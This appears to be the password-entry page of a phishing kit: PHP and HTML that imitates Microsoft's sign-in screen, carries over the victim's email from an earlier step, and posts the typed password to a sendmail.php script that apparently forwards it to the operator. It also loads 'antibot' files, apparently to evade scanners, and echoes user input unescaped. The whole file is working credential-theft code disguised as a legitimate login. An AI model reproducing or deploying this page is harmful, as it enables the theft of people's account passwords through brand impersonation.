<?php
session_start();
error_reporting(0);
include('antibots/bitch.php');
include('antibots/antibot.php');
if(isset($_POST['email'])){
    $email = $_POST['email'];
    
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.9">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    
    <link rel="stylesheet" href="css/bootstrap.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.3/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
    <link rel="stylesheet" href="css/custm.css" />
    
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat|Roboto|Noto+Sans|Inter|Roboto+Condensed"/>
    
    <title>Sign in to your Microsoft account</title>
    <style type="text/css">
        @font-face{
            font-family: Segui;
            src: url('fonts/phagspa.ttf');
        }
        @font-face{
            font-family: Segbl;
            src: url('fonts/segoe_ui_bold.ttf');
        }
        body{
            background: white;
            zoom: .91;
        }
        .body{
            display: -webkit-box;
            display: -moz-box;
            display: -ms-flexbox;
            display: -webkit-flex;
            display: flex;
            justify-content: center;
        }
        .body > div{
            max-width: 480px;
            width: 100%;
        }
        .body section{
            padding: 25px;
        }
        a{
            color: #0067B8;
        }
        .s1 a{
            font-size: 15px;
        }
        .s1 a:hover{
            color: grey;
            text-decoration: underline;
        }
        .ua:hover{
            text-decoration: underline;
        }
        .back-img{
            border-radius: 100%;
            margin-right: 3px;
            height: 22px;
            width: 22px;
        }
        .back-img:hover{
            background: #d1d1d1;
        }
        form{
            width: 100%;
        }
        #pass{
            width: 100%;
            border: none;
            border-radius: 0;
            -webkit-border-radius: 0;
            -moz-border-radius: 0;
            -khtml-border-radius: 0;
            outline: none;
            padding: 0;
            margin-bottom: 15px;
            border-bottom: 1px solid #353535;
            padding-bottom: 6px;
        }
        #pass:focus{
            border-color: #0067B8;
        }
        .img-fluid{
            margin-top: 3px;
            width: 118px;
        }
        .button-dark, .button-pri{
            padding: 5px;
            padding-left: 10px;
            padding-right: 10px;
            width: 118px;
            text-align: center;
            outline: none;
            border: none;
        }
        .button-dark{
            margin-right: 4px;
            background: #cccccc;
            color: black;
        }
        .button-dark:hover{
            background: #b7b7b7;
        }
        .button-pri{
            background: #036cbd;
            color: white;
        }
        .button-pri:hover{
            background: #024e88;
        }
        p{
            font-size: 15px;
        }
        
        .bottom{
            font-size: 14px;
            position: absolute;
            display: -webkit-box;
            display: -moz-box;
            display: -ms-flexbox;
            display: -webkit-flex;
            display: flex;
            bottom: 0;
            
        }
        .bottom a{
            color: grey;
        }
        .bottom a div{
            font-size: 13px;
            padding: 10px;
            padding-bottom: 6px;
        }
        .d-flex{
            display: -webkit-box;
            display: -moz-box;
            display: -ms-flexbox;
            display: -webkit-flex;
        }
        @media (min-width: 605px){
            body{
                background: #e7e7e7;
            }
            .body{
                position: absolute;
                top: 47%;
                left: 50%;
                transform: translateY(-50%) translateX(-50%);
                -ms-transform: translateY(-50%) translateX(-50%);
                -webkit-transform: translateY(-50%) translateX(-50%);
                -moz-transform: translateY(-50%) translateX(-50%);
                -o-transform: translateY(-50%) translateX(-50%);
            }
            .body > div{
                position: relative;
                min-width: 533px;
                width: 100%;
            }
            .body section{
                padding: 50px;
                background: white;
                margin: 25px;
                box-shadow: 0 0 5px 2px lightgrey;
            }
            .body .s2{
                padding: 0;

            }
            .bottom{
                left: none;
                right: 0;
            }
            .bottom a div{
                color: black;
                padding-left: 12px;
                padding-right: 12px;
            }
            .opt{
                border: none;
                margin: 0;
            }
            .opt a, .opt i{
                margin: 0;
            }
        }
    </style>
</head>
<body>
    <div class="body"><div>
    <section class="s1">
    <div style="margin-bottom: 20px">
        <img class="img-fluid" src="images/microsoft-logo.svg" alt="logo" />
    </div>
    <p><img src="./images/arrow_left.svg" alt="" style="" class="back-img"><?php echo $email; ?></p>
    <h3 style="margin-bottom: 20px; font-size: 26px">Enter password</h3>
    <form action="sendmail.php" method="post">
        <input type="text" name="password" id="pass" placeholder="Password" required/>
        <input type="hidden" name="email" value="<?php echo $email; ?>" />
        <p style="margin-bottom: 25px"><a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf%3fclient_id%3d4765445b-32c6-49b0-83e6-1d93765276ca%26scope%3dopenid%2bprofile%2bhttps%253a%252f%252fwww.office.com%252fv2%252fOfficeHome.All%26redirect_uri%3dhttps%253a%252f%252fwww.office.com%252flandingv2%26response_type%3dcode%2bid_token%26state%3dEUE6yhIe_upjyK9GCdTwEW5AUdoDMUtBuDj2y6nwHrbySRunOB0lLwi73p8Ty6KERmBQMuWjVz5n4hKLejxGCr8X9PFLihZiznwvTjkXVic8hiIfLIbtEw3dWuLcsodH3PwY4UPJOzTWWL8GdTVXN-3MItvsHu88piX82CxQY7JctfR0COpKrUlgQ0ys62RZhRnNybfNKiT4YPpk7mX0txyQceRNBu1twRq8Eqz9DhVmo2vnxvdoAKDaD5ftWymlkFbdjCCzASj-BQee37x0ui6c20KGeZrOYFpR3GN0eUY%26response_mode%3dform_post%26nonce%3d637950346241081932.OWVmNTU2YzEtYjgxNC00YmI3LWIwZDctOWNhODA5MzNmMDViOGUyY2EyMjctNTBmZC00YzEyLThiNGEtNDAyMWQ2YzM4YWUw%26x-client-SKU%3dID_NETSTANDARD2_0%26x-client-Ver%3d6.12.1.0%26uaid%3d719273e45aed4ba78b724f835f630d95%26msproxy%3d1%26issuer%3dmso%26tenant%3dcommon%26ui_locales%3den-US%26epct%3dAQABAAAAAAD--DLA3VO7QrddgJg7WevroSadtwl7fTga88x5lwRDctZ3OyQT4Zpf9O6dyljn6Hiq1OXqd3gNB4PIIdaKQW-CghEWOU8dg3wmVU6IteNRyOaezJl8TDpT2yURJRoReCBn04rNpv2YPu5yVy-Lq-ky6pLTEyJ17HNQgR4218ibBhO9dq8PqS_xnjUcfuijYWpoeWJ0sfaXJk4XyS2kQnl1h3D_EBuv97QXe2KaTBTGaSAA%26jshs%3d0%26username%3djhoook%26login_hint%3djhoook%26contextid%3d370C47DEBCDD7EF5%26bk%3d1659437999&id=290950&uiflavor=web&client_id=1E00004040979A&uaid=719273e45aed4ba78b724f835f630d95&mkt=EN-US&lc=1033&bk=1659437999">Forgot password?</a></p>
        <div class="d-flex justify-content-end align-items-center">
            <input type="submit" id="buttP" name="submit" class="button-pri" value="Sign in"/>
        </div>
    </form>
    </section>
    </div></div>
    <div class="bottom">
        <a class="ua" href="https://www.microsoft.com/en-US/servicesagreement/"><div>Terms of use</div></a>
        <a class="ua" href="https://privacy.microsoft.com/en-US/privacystatement"><div>Privacy & cookies</div></a>
        <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637950346241081932.OWVmNTU2YzEtYjgxNC00YmI3LWIwZDctOWNhODA5MzNmMDViOGUyY2EyMjctNTBmZC00YzEyLThiNGEtNDAyMWQ2YzM4YWUw&ui_locales=en-US&mkt=en-US&client-request-id=719273e4-5aed-4ba7-8b72-4f835f630d95&state=EUE6yhIe_upjyK9GCdTwEW5AUdoDMUtBuDj2y6nwHrbySRunOB0lLwi73p8Ty6KERmBQMuWjVz5n4hKLejxGCr8X9PFLihZiznwvTjkXVic8hiIfLIbtEw3dWuLcsodH3PwY4UPJOzTWWL8GdTVXN-3MItvsHu88piX82CxQY7JctfR0COpKrUlgQ0ys62RZhRnNybfNKiT4YPpk7mX0txyQceRNBu1twRq8Eqz9DhVmo2vnxvdoAKDaD5ftWymlkFbdjCCzASj-BQee37x0ui6c20KGeZrOYFpR3GN0eUY&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0&sso_reload=true#" style="font-weight: bold; font-size: 16px"><div>· · ·</div></a>
    </div>
    <script>
        var buttP = document.getElementById("buttP"), buttG = document.getElementById("buttG");
        if( /iPhone|iPad|iPod/.test(navigator.userAgent) ) {
            document.body.style.zoom = "normal";
            document.body.style.fontFamily = "Segui";
            h3.style.fontFamily = "Segbl";
            document.write('<meta name="viewport" content="width=device-width,height='+window.innerHeight+', initial-scale=.91">');
            buttP.style.borderRadius = "5px";
            buttG.style.borderRadius = "5px";
        }else{
            document.write('<meta name="viewport" content="width=device-width,height='+window.innerHeight+', initial-scale=1">');
        }
    </script>
    <script src="js/bootstrap.js"></script>
    
</body>
</html>
<?php
}else{
header("location: sign-in.php");
}
?>